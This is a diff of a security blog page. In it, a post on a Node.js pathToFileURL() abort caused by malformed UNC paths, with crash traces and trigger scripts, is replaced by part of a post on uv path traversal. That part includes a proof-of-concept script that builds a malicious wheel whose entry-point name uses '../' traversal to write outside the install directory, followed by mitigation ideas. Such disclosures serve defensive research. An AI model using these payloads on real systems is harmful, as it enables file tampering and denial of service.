+</pre></td><td class="rouge-code"><pre>python3 - <span class="o">&lt;&lt;</span><span class="sh">'</span><span class="no">PY</span><span class="sh">'
+import zipfile
 
-  #  node[95573]: static void node::url::BindingData::PathToFileURL(const FunctionCallbackInfo&lt;Value&gt; &amp;) at ../src/node_url.cc:172
-  #  Assertion failed: out-&gt;set_hostname(hostname.ToStringView())
+wheel = "epevil-0.1.0-py3-none-any.whl"
+dist = "epevil-0.1.0.dist-info"
 
------ Native stack trace -----
+entry_points = "[console_scripts]</span><span class="se">\n</span><span class="sh">../../entrypoint_victim.sh = epevil:main</span><span class="se">\n</span><span class="sh">"
 
- 1: 0x90ace8 node::Assert(node::AssertionInfo const&amp;) [node]
- 2: 0xa2a2b7 node::url::BindingData::PathToFileURL(v8::FunctionCallbackInfo&lt;v8::Value&gt; const&amp;) [node]
- 3: 0x771269d8fb4d 
+with zipfile.ZipFile(wheel, "w") as z:
+    z.writestr("epevil.py", "def main():</span><span class="se">\n</span><span class="sh">    print('hello from epevil')</span><span class="se">\n</span><span class="sh">")
+    z.writestr(
+        f"{dist}/METADATA",
+        "Metadata-Version: 2.1</span><span class="se">\n</span><span class="sh">Name: epevil</span><span class="se">\n</span><span class="sh">Version: 0.1.0</span><span class="se">\n</span><span class="sh">"
+    )
+    z.writestr(
+        f"{dist}/WHEEL",
+        "Wheel-Version: 1.0</span><span class="se">\n</span><span class="sh">Generator: poc</span><span class="se">\n</span><span class="sh">Root-Is-Purelib: true</span><span class="se">\n</span><span class="sh">Tag: py3-none-any</span><span class="se">\n</span><span class="sh">"
+    )
+    z.writestr(f"{dist}/entry_points.txt", entry_points)
+    z.writestr(
+        f"{dist}/RECORD",
+        "epevil.py,,</span><span class="se">\n</span><span class="sh">"
+        f"{dist}/METADATA,,</span><span class="se">\n</span><span class="sh">"
+        f"{dist}/WHEEL,,</span><span class="se">\n</span><span class="sh">"
+        f"{dist}/entry_points.txt,,</span><span class="se">\n</span><span class="sh">"
+        f"{dist}/RECORD,,</span><span class="se">\n</span><span class="sh">"
+    )
+</span><span class="no">PY
+</span></pre></td></tr></tbody></table></code></div></div>
 
------ JavaScript stack trace -----
+<ol>
+  <li>Confirm wheel exists:</li>
+</ol>
 
-1: URL (node:internal/url:825:20)
-2: pathToFileURL (node:internal/url:1659:12)
-3: pathToFileURL (node:url:1022:10)
-4: [eval]:1:21
-5: runScriptInThisContext (node:internal/vm:219:10)
-6: node:internal/process/execution:483:12
-7: [eval]-wrapper:6:24
-8: runScriptInContext (node:internal/process/execution:481:60)
-9: evalFunction (node:internal/process/execution:315:30)
-10: evalTypeScript (node:internal/process/execution:327:3)
-
-
-Aborted (core dumped)
-134
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Instead of throwing a normal JavaScript exception, Node aborts from native code.</p>
-
-<h3 id="what-pathtofileurl-does"><span class="me-2">What pathToFileURL() Does</span><a href="#what-pathtofileurl-does" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-
-<p>pathToFileURL() converts filesystem paths into file:// URLs.</p>
-
-<p>Examples:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>pathToFileURL('/tmp/test.txt')
+</pre></td><td class="rouge-code"><pre><span class="nb">ls </span>epevil-0.1.0-py3-none-any.whl
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Returns:</p>
+<ol>
+  <li>Install wheel:</li>
+</ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>file:///tmp/test.txt
+</pre></td><td class="rouge-code"><pre>uv pip <span class="nb">install</span> <span class="nt">--python</span> /tmp/uv-poc/venv/bin/python epevil-0.1.0-py3-none-any.whl
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Windows examples:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>pathToFileURL('C:\\test.txt')
-</pre></td></tr></tbody></table></code></div></div>
+<p>The number of <code class="language-plaintext highlighter-rouge">../</code> segments depends on filesystem layout. Using <code class="language-plaintext highlighter-rouge">os.path.relpath(...)</code> makes the traversal payload portable across machines.</p>
 
-<p>Returns:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>file:///C:/test.txt
-</pre></td></tr></tbody></table></code></div></div>
+<h2 id="security-impact"><span class="me-2">Security Impact</span><a href="#security-impact" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>UNC paths such as:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>\\server\share\file.txt
-</pre></td></tr></tbody></table></code></div></div>
+<p>These issues are dangerous because they trigger through normal package management operations and operate on filesystem paths, not just package metadata. Depending on user permissions and deployment context, impact may range from local data loss to tampering with operational scripts.</p>
 
-<p>Need special handling and become:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>file://server/share/file.txt
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>So internally Node needs to parse:</p>
+<h2 id="mitigation-ideas"><span class="me-2">Mitigation Ideas</span><a href="#mitigation-ideas" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
 <ul>
-  <li>hostname</li>
-  <li>share path</li>
-  <li>separators</li>
-  <li>validity of hostnames</li>
+  <li>Canonicalize and validate all untrusted paths from wheel metadata before filesystem operations.</li>
+  <li>Enforce strict containment checks (<code class="language-plaintext highlighter-rouge">resolved_path.starts_with(expected_root)</code>) after resolution.</li>
+  <li>Reject traversal segments and path separators in script names.</li>
+  <li>Treat <code class="language-plaintext highlighter-rouge">entry_points</code> script names as logical identifiers, not path fragments.</li>
+  <li>Add regression tests that include malicious <code class="language-plaintext highlighter-rouge">RECORD</code> and <code class="language-plaintext highlighter-rouge">entry_points.txt</code> payloads.</li>
 </ul>
-
-<p>That is where malformed input becomes interesting.</p>
-
-<h3 id="root-cause"><span class="me-2">Root Cause</span><a href="#root-cause" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-
-<p>The malformed hostname section:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>exa mple
-</pre></td></tr></tbody></table></code></div></div>
-<p>contains a space.</p>
-
-<p>Somewhere during native processing this eventually reaches:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>out-&gt;set_hostname(hostname.ToStringView())
-</pre></td></tr></tbody></table></code></div></div>
-<p>Which triggers an assertion rather than rejecting the input gracefully.</p>
-
-<p>Expected behavior:</p>
-
-<ul>
-  <li>throw exception</li>
-  <li>reject invalid UNC host</li>
-</ul>
-
-<p>Actual behavior:</p>
-
-<ul>
-  <li>process aborts</li>
-</ul>
-
-<p>If user-controlled input reaches affected code paths, an attacker may be able to crash a Node.js process.</p>
-
-<p>That could mean:</p>
-
-<ul>
-  <li>CLI tooling crash</li>
-  <li>worker restart loops</li>
-  <li>service instability</li>
-  <li>availability impact</li>
-</ul>
-
-<p>Even when not considered a security issue upstream, process aborts are still worth fixing. After the initial crash, I checked where else pathToFileURL() was used internally.</p>
-
-<p>Multiple places were interesting.</p>
-
-<p>1) CLI Entry Path Handling</p>
-
-<p>Node startup path handling uses:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>pathToFileURL(mainPath)
-</pre></td></tr></tbody></table></code></div></div>
-<p>Inside:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>lib/internal/modules/run_main.js
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>2) node –check</p>
-
-<p>Syntax checking flow also reaches:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>pathToFileURL(filename)
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Inside:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>lib/internal/main/check_syntax.js
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>3) VM Dynamic Import Referrer</p>
-
-<p>This path was interesting:</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-</pre></td><td class="rouge-code"><pre>const vm = require('node:vm');
-
-new vm.Script('import("node:fs")', {
-  filename: process.argv[2],
-  importModuleDynamically:
-    vm.constants.USE_MAIN_CONTEXT_DEFAULT_LOADER,
-}).runInThisContext();
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>If filename is attacker controlled, it can flow into referrer normalization using pathToFileURL().</p>
-
-<p>4) Public node:module APIs</p>
-
-<p>Two public APIs also reached the same sink.</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>Module.findPackageJSON(..., base)
-</pre></td></tr></tbody></table></code></div></div>
-<p>and</p>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>Module.findSourceMap(sourceURL)
-</pre></td></tr></tbody></table></code></div></div>
-<p>The easiest trigger was:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>const Module = require("node:module");
-Module.findSourceMap(process.argv[2]);
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Run:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>node run.js "\\ex ample\\share\\file.txt"
-
-Crash.
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>I also reproduced this on Windows where the process aborted with the same assertion stack trace. You can see it below</p>
-
-<p><a href="/assets/img/blog/nodejs-denial-of-service/nodejs1.png" class="popup img-link shimmer"><img src="/assets/img/blog/nodejs-denial-of-service/nodejs1.png" alt="" loading="lazy"></a>
-<a href="/assets/img/blog/nodejs-denial-of-service/nodejs2.png" class="popup img-link shimmer"><img src="/assets/img/blog/nodejs-denial-of-service/nodejs2.png" alt="" loading="lazy"></a></p>
-
-<p>I initially tried to report it through HackerOne under the Node.js program. However, low signal restrictions in hackerone prevented submission. After that I contacted the Node.js security / WG folks through their Slack channels and shared details. Their view was that this should be treated as a bug rather than a security issue.</p>
-
-<p>That is fair from a triage perspective:</p>
-
-<ul>
-  <li>no RCE</li>
-  <li>no memory corruption</li>
-  <li>no privilege escalation</li>
-  <li>controlled malformed input causes abort</li>
-</ul>
-
-<p>Still, if externally reachable, crashes can matter operationally. This was a fun find because it started as random fuzzing and turned into:</p>
-
-<ul>
-  <li>root cause review</li>
-  <li>call graph tracing</li>
-  <li>multiple reachable sinks</li>
-  <li>upstream bug confirmation</li>
-</ul>
-
-<p>Sometimes the best bugs are not flashy memory corruption bugs.Sometimes it is just one malformed path and an assertion waiting behind it. Learning security while segfaulting through life.</p>
 
   </div>
 
@@ -1172,9 +1207,19 @@ Crash.
         <i class="fa fa-tags fa-fw me-1"></i>
         
           <a
-            href="/tags/nodejs/"
+            href="/tags/uv/"
             class="post-tag no-text-decoration"
-          >nodejs</a>
+          >uv</a>
+        
+          <a
+            href="/tags/python/"
+            class="post-tag no-text-decoration"
+          >python</a>
+        
+          <a
+            href="/tags/path-traversal/"
+            class="post-tag no-text-decoration"
+          >path-traversal</a>
         
       </div>
     
@@ -1210,7 +1255,7 @@ Crash.
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=A%20Weird%20UNC%20Path%20That%20can%20Crash%20Node.js%20-%20%F0%9F%92%BB%20%7C%20Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fnodejs-denial-of-service%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=uv%20Path%20Traversal%20Findings:%20Arbitrary%20Delete%20and%20Write%20-%20%F0%9F%92%BB%20%7C%20Blog&url=http%3A%2F%2Flocalhost%3A4000%2F2026-05-17-uv-path-traversal-findings.html" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fab fa-twitter"></i>
       </a>
     
@@ -2437,12 +2482,6 @@ Crash.
 
 
 
-  <div class="toc-border-cover z-3"></div>
-  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
-    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
-    <nav id="toc"></nav>
-  </section>
-
 
             
           </aside>
@@ -2540,7 +2579,27 @@ Crash.
   
 
   
-    
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
   
 
   
@@ -2636,7 +2695,7 @@ Crash.
         </article>
       
         <article class="col">
-          <a href="/posts/fuzzing-microvium/" class="post-preview card h-100">
+          <a href="/posts/nodejs-denial-of-service/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -2648,16 +2707,16 @@ Crash.
 
 <time
   
-  data-ts="1774689952"
+  data-ts="1776072352"
   data-df="ll"
   
 >
-  Mar 28, 2026
+  Apr 13, 2026
 </time>
 
-              <h4 class="pt-0 my-2">Fuzzing Microvium Embedded JavaScript Engine</h4>
+              <h4 class="pt-0 my-2">A Weird UNC Path That can Crash Node.js</h4>
               <div class="text-muted">
-                <p>So I decided to fuzz Microvium. If you haven’t heard of it, Microvium is this tiny JavaScript engine designed for embedded systems like IoT devices, microcontrollers, stuff where you’ve got maybe 1...</p>
+                <p>Recently while fuzzing Node.js modules I found an issue which causes the process to abort when malformed Windows UNC style paths are passed into pathToFileURL(). This was initially something I look...</p>
               </div>
             </div>
           </a>
@@ -2677,23 +2736,15 @@ Crash.
   
 
   
-    <a
-      href="/posts/fuzzing-microvium/"
-      class="btn btn-outline-primary"
-      aria-label="Older"
-    >
-      <p>Fuzzing Microvium Embedded JavaScript Engine</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Older">
+      <p>-</p>
+    </div>
   
 
   
-    <a
-      href="/posts/cocoapods-exe-hijacking/"
-      class="btn btn-outline-primary"
-      aria-label="Newer"
-    >
-      <p>Disclosure: Local Executable Hijacking in CocoaPods via Unsafe Path Search</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
   
 </nav>
 
